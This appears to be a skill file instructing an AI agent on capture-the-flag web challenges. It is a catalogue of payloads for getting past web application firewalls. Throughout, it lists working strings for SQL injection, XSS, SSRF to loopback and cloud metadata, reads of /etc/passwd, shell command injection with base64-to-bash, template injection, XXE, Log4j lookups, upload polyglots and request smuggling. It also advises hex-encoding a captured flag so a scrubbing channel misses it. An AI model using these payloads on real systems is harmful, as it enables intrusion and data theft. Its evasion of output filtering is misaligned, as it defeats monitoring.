---
name: waf-bypass
description: >
  Bypass WAF / gateway / charblock / keyword filters (403, 406, 501, 拦截,
  非法字符) while the backend still parses the request. Per-class mutations
  first (SQLi XSS SSRF LFI RCE SSTI XXE NoSQL upload deser), then generic
  carriers: Content-Type, charset, multipart, JSON/XML parser gaps, HPP,
  chunked, HTTP/2 delayed DATA, encoding, path, oversize. Not a wordlist,
  not a product writeup. One mutation at a time.
---

# WAF bypass — the gate ≠ the bug is gone

403 / 406 / charblock / "illegal character" is the **gate** catching a literal feature — not parameterization, not a reason to switch CVE.
**Leave the class.** One change at a time.
No outbound net on this box: do not hunt origin IPs, no Collaborator / interactsh.

```
blocked request vs harmless request that passes the gate
  → class-specific mutation first (§1–§11) until the keyword no longer triggers
  → still blocked → generic carrier (§G): parser / protocol / path / headers / padding
  → still blocked → generic encoding (§G.6)
```

`correct: false` with the sink already open → the submit channel is scrubbing, not entry WAF (exfil in hex; do not put raw `flag{` on that channel).

## 0. Which layer is blocking

| Symptom | Move first |
|---|---|
| Literal path 403; encoded becomes 401/400/200 | §G.4 path |
| Body keyword 403; empty param 200 | class mutation, then §G.1 switch parser |
| Whole JSON/multipart 403; short body passes | §G.3 padding / §G.1 switch type |
| Only one header blocked | §G.5 headers |
| H1 blocked, H2 passes (or reverse) | §G.2 HTTP/2 |
| Same payload blocked on GET, passes on POST (or reverse) | switch method / `X-HTTP-Method-Override` |

WAF and backend are not the same parser (WAFFLED / ACSAC 2025: 1207 bypasses with payload unchanged, structure only).

Class index (what is blocked → try first):

| Class | Often blocked | Try first |
|---|---|---|
| SQLi | `'` `union` `select` `--` | comments / `1e0union` / `CHAR` / HPP |
| XSS | `<script` `onerror` `javascript:` `alert(` | other tags / entities / `alert\`1\`` |
| SSRF | `127.0.0.1` `file:` `169.254` | `127.1` `0` `[::1]` decimal IP, `@` |
| LFI | `../` `php://` `/etc/passwd` | double encoding / wrapper case / `....//` |
| Command injection | `;` `\|` `cat` space `/etc` | `${IFS}` glob / base64 / `%0a` |
| SSTI | `{{` `${` `__class__` | split tokens / `\x5f` / `\|attr` / other braces |
| XXE | `<!DOCTYPE` `SYSTEM` `ENTITY` | parameter entity / UTF-16 / CDATA / PUBLIC |
| NoSQL | `$ne` `$gt` `$where` | other operators / JSON body / `[$ne]` |
| Upload | `.php` `<?php` MIME | double ext / magic bytes / Disposition gap |
| Deser / JNDI | `rO0` `Tzo` `ldap://` `${jndi` | switch type, chunk, nested lookup |
| CRLF / redirect | `%0d%0a` `http://` | lone `%0d` / `//` / `@` |

---

## 1. SQLi

Keywords often blocked: `'` `"` `union` `select` `from` `where` `--` `#` `sleep` `benchmark` `information_schema`.

**Split keywords / whitespace**

| Trick | Example |
|---|---|
| Block comment as space | `UN/**/ION/**/SE/**/LECT` |
| MySQL executable comment | `/*!UNION*/ /*!SELECT*/` |
| Versioned comment | `/*!50000UNION*//*!50000SELECT*/` |
| Case | `uNiOn SeLeCt` |
| Whitespace substitutes | `%09` `%0a` `%0b` `%0c` `%0d` `%a0` `%00` |
| Parentheses, no spaces | `UNION(SELECT(1),2,3)` |
| Scientific glued to keyword | `1e0union` `1.1union` `2e-1union` |
| Line-comment shapes | `--` `--+` `--%0a` `#` `%23` `;%00` |

**Logic / function substitutes (signatures hit `OR 1=1` / `AND 1=2` / `NULL` / `SLEEP`)**

| Blocked | Replace with |
|---|---|
| `OR 1=1` | `OR 2=2` `OR 'a'='a'` `OR 0x50=0x50` `OR true` `\|\|1` `OR 1 IN (1)` `OR 1 LIKE 1` `OR 1 BETWEEN 0 AND 2` `OR 1 REGEXP 1` |
| `AND 0` | `AND 1*0` `AND 1-1` `AND char(0)` `AND mod(29,9)` `AND nullif(1,1)` |
| `UNION SELECT NULL` | `UNION ALL SELECT` `UNION DISTINCT SELECT` `UNION SELECT 0` `UNION SELECT false` `UNION SELECT char(null)` `UNION SELECT 34=35` |
| `SLEEP` / `WAITFOR` | MySQL `BENCHMARK` `GET_LOCK`; MSSQL cartesian heavy query; PG `pg_sleep`; expensive functions instead of delay |
| `information_schema` | `mysql.innodb_table_stats` `sys.schemas` `sqlite_master` |

JSON SQL (WAF knows `UNION`/`OR 1=1`, not JSON functions): `' OR JSON_LENGTH("{}")<=8896 UNION SELECT @@version#`; PG: `(SELECT json_agg(t) FROM t)::text`.

**Dequote / encode keywords**

| Trick | Example |
|---|---|
| URL | `%27` `%22` `%2d%2d` |
| Double / triple | `%2527` `%252527` |
| IIS `%u` | `%u0027` `%u0055nion` |
| JSON `\u` | `\u0027` `\u0075\u006e\u0069\u006f\u006e` |
| Illegal UTF-8 quote | **`%ff%27` `%c0%27`** (do not UTF-8-encode U+00FF) |
| Overlong UTF-8 | `%c0%a7` as `'` |
| Hex literal | `0x756e696f6e` (= `union`); `0x50=0x50` |
| `CHAR` / `CONCAT` | `CHAR(117,110,105,111,110)` `un'+'ion` `CONCAT(0x75,0x6e)` |
| Quote-less strings | MySQL `0x…` / `CHAR`; PG `CHR` / `$$…$$`; MSSQL `CHAR`/`NCHAR` |
| Scientific + comment | `1e0un/**/ion` |

**HPP / HPF (split one SQL across parameters)**

- HPP duplicate names: `id=1;select+1&id=2,3+from+users--` (ASP concatenates with comma; PHP last; JSP first)
- HPF across different params with comments: `a=1+union/*&b=*/select+1,2` (app joining a+b restores the query)
- Open quotes across params: `year=2010' AND 'x'<>"&month=" UNION SELECT 1,2--`

Engine gaps: MySQL comments/`/*!/`/`#`; PG `$$`/`CHR`/`::`; MSSQL stacked `;` / `WAITFOR`; SQLite `\|\|`/`CHAR`. Login injection: craft the payload; if blocked, wrap this section / §G. Do not spray passwords.

---

## 2. XSS

Keywords often blocked: `<script` `onerror` `onload` `javascript:` `alert(` `eval(` `document.cookie`. Confirm the reflection context first (HTML / attribute / JS string / URL), then mutate. On this box the XSS victim is `playwright-cli`.

**Other tags / events (`<script` dead → switch)**

| Trick | Example |
|---|---|
| No interaction | `<img src=x onerror=alert(1)>` `<svg onload=alert(1)>` `<video src=x onerror=alert(1)>` `<audio src=x onerror=alert(1)>` `<body onload=alert(1)>` |
| Rare / unknown tags | `<details open ontoggle=alert(1)>` `<input autofocus onfocus=alert(1)>` `<marquee onstart=alert(1)>` `<xss onmouseover=alert(1)>` `<x id=y tabindex=1 onfocus=alert(1) autofocus>` |
| SVG animation | `<svg><animate onbegin=alert(1) attributeName=x></svg>` |
| math / nesting | `<math><mtext><table>…` then break the tag (parser gap) |
| `/` as whitespace | `<svg/onload=alert(1)>` `<img/onerror=alert(1) src=x>` |
| Case | `<sCRipT>` `oNeRrOr=` |
| Junk attributes | `<script/x>` `<script ~=@>` `<img """><script>` |

**Drop `alert(` / parens / quotes**

| Trick | Example |
|---|---|
| Template literal | `alert\`1\`` `alert\`XSS\`` |
| Other functions | `confirm(1)` `prompt(1)` `print()` `throw 1` |
| Named-entity parens | `alert&lpar;1&rpar;` |
| JS unicode | `\u0061lert(1)` `\u0061\u006c\u0065\u0072\u0074(1)` |
| Hex JS | `\x61lert(1)` |
| fromCharCode | `eval(String.fromCharCode(97,108,101,114,116,40,49,41))` |
| atob | `eval(atob('YWxlcnQoMSk='))` |
| Concat | `eval('ale'+'rt(1)')` `window['ale'+'rt'](1)` |

**Encoding (WAF sees the raw form; the browser / attribute decoder runs it)**

| Trick | Example |
|---|---|
| HTML entities | `&#x61;lert` `&#97;lert` `&#x3c;script&#x3e;` |
| Leading zeros / no semicolon | `&#000097;` `&#x00061;` `&#x61lert` (browser still decodes inside attribute values) |
| Split `javascript:` | `ja&#x76;ascript:` `javascript&#58;` `java&#115;cript:` |
| URL | `%3Cscript%3E`; double `%253C` |
| Null byte | `<scri%00pt>` `<script%00>` |
| Whitespace in the tag name | `%09` `%0a` `%0d` `%08`: `<s%09cript>` |
| Fullwidth / NFKC | `＜script＞` `＝` (backend normalizes to ASCII) |
| Mixed | entity + URL + `\u` one layer; do not stack five |

HTML attribute values are entity-decoded before JS: `<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">`. If `javascript:` is blocked, entity-split `j`/`s`/`:`.

---

## 3. SSRF

Keywords often blocked: `127.0.0.1` `localhost` `0.0.0.0` `file:` `gopher:` `169.254` `::1`. No outbound: only this box / the challenge network. No OAST, no nip.io / attacker DNS.

**Same address, different spelling (literal string compares die here)**

| Trick | `127.0.0.1` | `169.254.169.254` |
|---|---|---|
| Short dotted | `127.1` `127.0.1` | — |
| Whole loopback net | `127.2.3.4` (entire `127.0.0.0/8`) | — |
| Decimal | `2130706433` | `2852039166` |
| Hex | `0x7f000001` `0x7f.0x0.0x0.0x1` | `0xa9fea9fe` |
| Octal | `0177.0.0.1` `017700000001` | `0251.0376.0251.0376` |
| Overflow | `127.0.0.257` (some stacks `%256` → `.1`) | — |
| `0` | `http://0/` `0.0.0.0` | — |
| IPv6 | `[::1]` `[::]` `[0000::1]` | `[::ffff:169.254.169.254]` |
| IPv4-mapped | `[::ffff:127.0.0.1]` `[::ffff:7f00:1]` `[0:0:0:0:0:ffff:7f00:1]` | `[0:0:0:0:0:ffff:a9fe:a9fe]` |
| Unicode dots | `127。0。0。1` `%E3%80%82` | circled digits `①②⑦.⓪.⓪.①` |

**URL parser gaps**

| Trick | Example |
|---|---|
| userinfo `@` | `http://evil@127.0.0.1` `http://127.0.0.1#@evil` (who owns host) |
| Backslash | `http://127.0.0.1\` `http:\\127.0.0.1` |
| Fragment / NUL | `#` `%00` truncates the host the filter sees |
| Other schemes | `file:///etc/passwd` `file://localhost/etc/passwd` `gopher://127.0.0.1:6379/_…` `dict://127.0.0.1:11211/` `ldap://127.0.0.1` |
| Local name | `localhost` (do not rely on outbound DNS that maps a public name to 127.0.0.1) |
| Follow 302 | a URL the filter allows, 302 to `127.0.0.1` (app follows, filter does not) |
| Case / encoding | `File://` `fIlE:` `%66ile://` |

Cloud metadata (if the lab looks like cloud): encode `169.254.169.254` with the table above; AWS path `/latest/meta-data/`; GCP needs header `Metadata-Flavor: Google`; Azure needs `Metadata: true`. Do not go outbound.

---

## 4. LFI / path traversal / RFI

Keywords often blocked: `../` `..\` `/etc/passwd` `php://` `file://` `data://` `expect://`.

**The traversal itself**

| Trick | Example |
|---|---|
| URL | `%2e%2e%2f` `%2e%2e/` `..%2f` `%2e%2e%5c` |
| Double / triple | `%252e%252e%252f` `..%252f` |
| IIS `%u` | `%u002e%u002e%u002f` |
| Overlong UTF-8 | `%c0%ae%c0%ae%c0%af` `%c0%ae` as `.` |
| Filters that strip `../` | `....//` `..././` `..;/` `..\/` |
| Mixed slashes | `..\..\windows\win.ini` `/\` `//` |
| NUL truncate (PHP < 5.3.4) | `/etc/passwd%00` `/etc/passwd%00.png` |
| Dot truncate / overlong | trailing `.` trailing space `%20`; push a forced suffix past 4096 bytes |
| Absolute | `/etc/passwd` `/proc/self/environ` `/proc/self/cwd/flag` `/proc/self/root/etc/passwd` |
| Windows | `..\..\windows\win.ini` trailing `.` `::$DATA` |

**PHP wrappers (`php://` dead → reshape, do not switch bugs)**

| Trick | Example |
|---|---|
| Case | `pHp://FilTer/convert.base64-encode/resource=index.php` |
| Encoded colon | `php%3a//filter/…` `php%253a%252f%252f` |
| Escape a prefix | `../../php://filter/convert.base64-encode/resource=config` |
| Read source | `php://filter/convert.base64-encode/resource=` `string.rot13` `zlib.deflate` |
| Chains | `php://filter/convert.iconv.utf-8.utf-16/resource=`; filter chain RCE with no file write |
| Other wrappers | `php://input` (POST body as the file) `data://text/plain;base64,…` `expect://id` `zip://` `phar://` `glob://` |

RFI: if `http://` is blocked try `\\host\share\a.php` (Windows), double-encoded URL, `ftp://`. No outbound: only the challenge address or this box.

---

## 5. Command injection / body RCE

Keywords often blocked: `;` `|` `&` `` ` `` `$()` space `cat` `ls` `id` `whoami` `wget` `curl` `/etc/passwd` `/bin/`.

**Separators and whitespace**

| Trick | Example |
|---|---|
| Other separators | `;` `\|` `\|\|` `&&` `&` `%0a` `%0d%0a` `` `id` `` `$(id)` |
| Space → IFS | `cat${IFS}/etc/passwd` `cat$IFS$9/etc/passwd` |
| Space → tab | `%09` |
| Brace expansion | `{cat,/etc/passwd}` |
| Redirect as space | `cat</etc/passwd` `cat<>/etc/passwd` |
| bash here-string, no pipe | `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)` |

**Keyword / path disguise**

| Trick | Example |
|---|---|
| glob | `/???/??t` `/bin/c?t` `/e*c/p*sswd` `cat /???/??ss??` |
| Insert quotes | `ca''t` `w"h"oami` `c'a't` |
| `$@` / `\` | `cat$@`; insert `\` in the name: `c\at` |
| Env slices for `/` `;` | `${PATH:0:1}` → `/`; `${LS_COLORS:10:1}` is sometimes `;` |
| Case / rev | `$(tr A-Z a-z<<<'WhOaMi')` `$(rev<<<'imaohw')` |
| base64 | `echo${IFS}Y2F0IC9ldGMvcGFzc3dk\|base64${IFS}-d\|bash` |
| hex / octal | `$(printf '\x69\x64')` `$(echo -e '\x63\x61\x74')` |
| ANSI-C | `$0<<<$'\x69\x64'` |

Windows: `^` escape, `%COMSPEC%`, PowerShell `-EncodedCommand`, `%PATHEXT:~3,1%`. Log4j / JNDI: §10, local `rogue-jndi`.

---

## 6. SSTI

Keywords often blocked: `{{` `}}` `${` `__class__` `__mro__` `request` `config`. Probe the engine first, then mutate for that engine.

Probes: `{{7*7}}` → 49 means Jinja/Twig/Pebble; `{{7*'7'}}` → `7777777` Jinja2, `49` Twig; `${7*7}` Freemarker/Velocity/EL; `<%=7*7%>` ERB/EJS; `{7*7}` Smarty; `*{7*7}` Thymeleaf.

| Blocked | Replace with |
|---|---|
| `{{` `}}` | `{% %}` (Jinja/Twig statements); other engine braces `${` `<#` `<%=` `[[` |
| `__` | `\x5f\x5fclass\x5f\x5f` `\u005f` `'__cl'+'ass__'` `request.args` putting the keyword in another param |
| `[]` / `.` | `\|attr('__class__')` `\|attr(request.args.x)` |
| Literal `class` | `request\|attr(request.args.q)` with `?q=__class__` |
| Whole expression | JSON `\u007b\u007b`; URL `%7b%7b`; split across two fields then join |

Jinja: `{{request\|attr('\x5f\x5fclass\x5f\x5f')}}`. Twig old: `_self.env`; newer: `\|map` / `\|filter`. Freemarker: `?new()` + `Execute`. Do not dump a full RCE chain first — get `{{7*7}}` through the gate.

---

## 7. XXE

Keywords often blocked: `<!DOCTYPE` `SYSTEM` `ENTITY` `file://` `<!ENTITY`. Prefer structure / encoding changes on the XML body; leave payload semantics.

| Trick | Example |
|---|---|
| Parameter entity | `<!ENTITY % e SYSTEM "file:///etc/passwd"> %e;` (when general entities are blocked) |
| PUBLIC instead of SYSTEM | `<!ENTITY % xxe PUBLIC "x" "file:///etc/passwd">` |
| CDATA around keywords | `<![CDATA[file:///etc/passwd]]>` |
| Entity-encode SYSTEM | `&#x53;&#x59;&#x53;&#x54;&#x45;&#x4d;`; Akamai-class: HTML-entity the whole declaration |
| Whitespace / newlines in the tag | `<!DOCTYPE foo [\n<!ENTITY\nxxe\nSYSTEM\n"file:///etc/passwd"\n]>` |
| Case | `<!doctype` `<!EnTiTy` |
| Namespace | `<a:id xmlns:a="urn:x">` (WAF sees the prefixed name) |
| Broken close | extra `]`, trailing junk, a second DOCTYPE |
| UTF-16 / UTF-32 / EBCDIC | `iconv -t UTF-16BE` the whole body; `Content-Type: application/xml; charset=utf-16` |
| Dual encoding | declare `encoding="UTF-16BE"` in UTF-8, rest of the doc in UTF-16 |
| BOM / leading space | BOM at the start; spaces before `<?xml` (lazy WAFs only scan the head) |
| XInclude / SOAP / SVG / XLSX / `application/xml` | switch carrier type; the DTD can stay |

No outbound: `SYSTEM "file:///…"` or local `expect://` / `php://`; no external DTD URL.

---

## 8. NoSQL

Keywords often blocked: `$ne` `$gt` `$regex` `$where` `$or`. Many WAFs only scan `$` in the query string and miss a JSON body.

| Trick | Example |
|---|---|
| Other operators | `$ne` → `$gt` `$gte` `$nin` `$exists` `$in` `$regex` |
| JSON body | `{"username":{"$ne":""},"password":{"$ne":""}}` |
| Form arrays | `username[$ne]=x&password[$ne]=x` |
| `$gt` empty string | `{"password":{"$gt":""}}` |
| `$regex` | `{"username":{"$regex":"^a"}}` |
| `$where` | try after `$ne` is blocked; split strings inside the JS |
| Duplicate keys | JSON `{"user":"safe","user":{"$ne":""}}` (who takes last) |
| Encode `$` | `%24ne` `\u0024ne`; switch `Content-Type: application/json` |

---

## 9. File upload

Blocks extension / MIME / content / `<?php` / `.php`. WAF and backend each pick their own `filename` / `Content-Type` / boundary.

| Blocked | Replace with |
|---|---|
| `.php` | `.php5` `.phtml` `.phar` `.php.jpg` `.php.` `.Php` `.php%00.jpg` `.php;.jpg` |
| MIME | part `Content-Type: image/jpeg` / `application/octet-stream` (file is still a script) |
| Content sniff | magic prefix `GIF89a` / `\xff\xd8\xff` / `\x89PNG` then the script (polyglot) |
| `<?php` | short `<?=`; UTF-16 script; EXIF / image comment |
| `filename=` | duplicate `filename=` (WAF takes one, backend the other); `filename="a.php "`; `name="f\x00"`; mixed quotes |
| `Content-Disposition` | write the line twice; TAB / space / `filename*=` (RFC 2231) in the middle |
| boundary | §G.1 multipart: fake boundary, `boundary*0=`, `\x00`, quotes |
| SVG / HTML | upload as XSS, skip `.php` |

---

## 10. Deserialization / JNDI

| Blocked | Replace with |
|---|---|
| Java `rO0` | URL / double / chunk / pad 8KB; switch `application/x-java-serialized-object` ↔ JSON ↔ form |
| PHP `Tzo` / `O:` | `C:` custom; `utf8_decode` filter gaps; switch Content-Type |
| `.NET` `AAEAAAD` | same, carrier first |
| `${jndi:ldap://` | nested `${${::-j}ndi:…}` `${${lower:j}ndi:…}`; `ldap`→`rmi`/`dns`/`iiop`; unicode / case `jNdI` |
| Literal `ldap://` | JSON `\u006c\u0064\u0061\u0070://`; URI only needs to connect; factory lives in the LDAP response |

Log4j: local `rogue-jndi` + `ldaps-wrap` + `java8`. No outbound.

---

## 11. CRLF / open redirect

| Class | Tricks |
|---|---|
| CRLF | `%0d%0a` `%0d` `%0a` `%0d%0a%09`; overlong `%E5%98%8A%E5%98%8D` (`囆囅` → CRLF); Unicode line sep `U+2028` |
| Redirect | `//127.0.0.1` `/\127.0.0.1` `https:%2f%2f` `@` `\/\`; encoded `.`; `///`; schemeless `//` |

Point only at the challenge / this box.

---

## G. Generic carriers (after class mutations still block)

Class mutations still blocked → **leave the payload**, change the carrier. WAF picks a parser from the declared type; the wrong one never inspects the real field. Backends often share **one API** for urlencoded and multipart (field >90% interchangeable).

### G.1 Content-Type / parser gap (prefer this)

**Switch type (same fields; original payload inserted as-is)**

| Try | Header |
|---|---|
| urlencoded | `application/x-www-form-urlencoded` |
| JSON | `application/json` / `application/ld+json` / `text/json` |
| multipart | `multipart/form-data` or `multipart/mixed` (some WAFs only inspect form-data) |
| XML | `application/xml` `text/xml` `application/soap+xml` |
| Omit | no Content-Type (some WAFs skip the body) |
| Invented | `application/x-custom` `text/plain` |
| Mismatch | JSON body + urlencoded header, or reverse (backend sniffs the body) |
| Multiple Content-Type | two headers; WAF takes the first, backend the last (old CRS) |
| Junk params in the header | `application/json; charset=utf-8; boundary=evil` (some parsers stop at charset) |

**JSON (WAF strict, backend JSON5/loose)**

- Comments: `{"id":1 /*x*/ }` or `//x` to break keywords
- Duplicate keys: `{"id":"safe","id":"payload"}` (who takes first vs last)
- `\uXXXX` every letter, not just the tail
- `\x00` in the key: `{"id\x00": "..."}`
- Nest past WAF JSON depth: `{"a":{"b":{"c": payload}}}`
- Numeric disguise: `1e0` glued to a keyword

**XML** — see §7; generic extras: namespace, parameter entity, CDATA, broken close.

**multipart (fattest structure, 351+ classes)**

- RFC 2231 continuation: `boundary=fake; boundary*0=real-; boundary*1=boundary`  
  WAF eats `fake`; backend concatenates `real-boundary`; malicious field sits in the real boundary
- Second `boundary=`, quotes, `;`, spaces, TAB, overlong boundary
- Drop `\r\n` before `--boundary`; mix `\n` / `\r\n`
- `\x00` or `; charset=` inside boundary
- Malicious charset on an **earlier** part; last part utf-8 (many rules only check the last part)
- Part `Content-Type: image/jpeg` / `application/octet-stream` (skipped as binary)
- Another part after `--bound--`
- Duplicate `name=` / `filename=` on `Content-Disposition`; `name="f\x00"`
- Per-part `Content-Transfer-Encoding: base64` / `quoted-printable`

### G.2 Protocol (the whole body slips past the WAF)

Do not change the payload; change **where the request ends**. Hit only `container_addr`.

**HTTP/1.1**

- `Transfer-Encoding: chunked`: split the keyword (`sel` / `ect`)
- Chunk extensions: `5;foo=bar\r\nHELLO` (one side ignores the ext, the other treats it as length)
- Chunk-size shapes: `05`, `5 `, `5\t`, uppercase hex
- Both CL and TE (CL.TE / TE.CL): front and back disagree on request end
- Two `Content-Length`, `Content-Length: 05`, `+13`, trailing space
- TE shapes: `chunked` / `xchunked` / `chunked ` / case / quotes / unicode space in TE / `\x00`
- Folded `Transfer-Encoding: \r\n chunked`
- GET/HEAD with a body (some fronts skip body, backend reads it)
- HTTP/1.0 keep-alive vs 1.1
- Method case: `post` / `PoSt` (some Apache)
- Extra `\r\n` before the request line

**HTTP/2 (`curl --http2`; only if the target speaks h2)**

- **HEADERS first, DATA late**: external WAF sees headers and allows; body arrives 200–500ms later. Same payload 403 on H1, 200 on split H2 frames = this class
- H2→H1 downgrade: smuggle `\r\nTransfer-Encoding: chunked` in a pseudo/header value (H2.CL / H2.TE)
- `:path` / `:method` bypass rules that only scan ordinary headers
- H2C: `Upgrade: h2c` + `HTTP2-Settings` (cleartext h2; some proxies treat later bytes as upgraded and the WAF stops looking)
- Malformed stream priority / dependency (structure still legal, payload unchanged; some H2 WAFs lose the stream)

### G.3 Length, compression, position

- Body inspection window: a harmless fat JSON field first, or a large text part first in multipart; put the payload **after 8KB / 16KB / 64KB** (AWS often 8KB; some CDNs fail-open when overlong)
- `Content-Encoding: gzip` / `deflate`: WAF does not inflate, backend does; invented `Content-Encoding: random` makes some stacks skip the body
- Split the keyword across two adjacent chunks / two JSON strings then concatenate
- Later requests on the same connection inspected more loosely: harmless keep-alive first, then the real payload (rare; worth one try)

### G.4 Path and query

Literal path 403 → change the path, not the bug. 403→401/400 is the gate opening.

- `%61` one byte, `%2561` double, triple `%252561`
- `/./` `//` `///` `/.` `/;` `/;` + junk (Tomcat strips `;`)
- `\` as `/` (IIS / some WHATWG)
- `%00` truncate, trailing `.` trailing space `%20` (Windows)
- Dot encodings: `%2e` `%252e` `..;/` `....//`
- Query delimiter: `%3f` in the path as `?` (WAF sees path, backend sees query)
- Case `/AdMin`, Unicode compat forms `／` `‥`

### G.5 Headers

- Header-name case: `Content-Type` vs `content-type` vs `CONTENT-TYPE`
- Folded whitespace, TAB instead of space
- Duplicate headers: WAF concatenates, backend takes last (or reverse)
- Move the payload to a less-inspected header: `Referer` `X-Forwarded-For` `X-Original-URL` `X-Rewrite-URL` `X-Forwarded-Host` `X-HTTP-Method-Override`
- Method override: `X-HTTP-Method-Override: POST` + GET query; `_method=`
- `\x00` / illegal tokens in header names (H2 can carry them, H1 cannot)

### G.6 Generic encoding (only after the carrier already passed and keywords still block)

Pick one row at a time. JSON context: `\u`; HTML: entities; SQL: comments / scientific notation.

| Trick | Example |
|---|---|
| URL | `%27` `%3C` `%3B` |
| Double/triple | `%2527` `%252527` |
| IIS `%u` | `%u0027` `%u003C` |
| JSON | `\u0027` `\u0075\u006e\u0069\u006f\u006e` |
| HTML entities | `&#x27;` `&#60;` |
| Overlong UTF-8 | `%c0%a7` as `'`; `%c0%ae` as `.`; `%c0%bc` as `<` (old parsers) |
| Illegal UTF-8 quote | live **`%ff%27` `%c0%27`** (do not UTF-8-encode U+00FF) |
| Null byte | `uni%00on` `<scri%00pt>` |
| Whitespace | `/**/` `%09` `%0b` `%0c` `%0d` `%a0` |
| NFKC compat | fullwidth `＜` `＝` `／` normalized to ASCII on the backend |
| Whole-body charset | declare `ibm037` / `utf-16le` / `utf-7` and encode the body that way (WAF matches ASCII signatures and misses) |

### G.7 HPP / HPF

See §1. Generic for any bug where the WAF inspects only the first same-named parameter and the backend concatenates / takes last: XSS events, SSRF URLs, LFI paths split the same way.

---

## How to try

1. Save the blocked request and a harmless request that passes the gate. Diff whether it is the path, one keyword, or the whole body.
2. Identify the class → walk **one** row in that class table. After the gate (status/Content-Type/JSON shape flipped), add the next cut.
3. Class mutation not enough → §G change the carrier, insert the original payload as-is.
4. Stay on that sink. No ffuf, no switch CVE.
5. Write `artifacts/exp.py` (`http.client` builds TE/chunk/raw headers better than curl). H2: `curl --http2` or `httpx`.
6. On mismatch, return to §G.1 and switch Content-Type. Do not stack five layers at once.

## Do not

- Treat 403 as the bug being dead / switch to the next CVE
- Stack five encodings at once
- Huge wordlists, full-library nuclei, year directories
- Go outbound for origin IPs / OAST
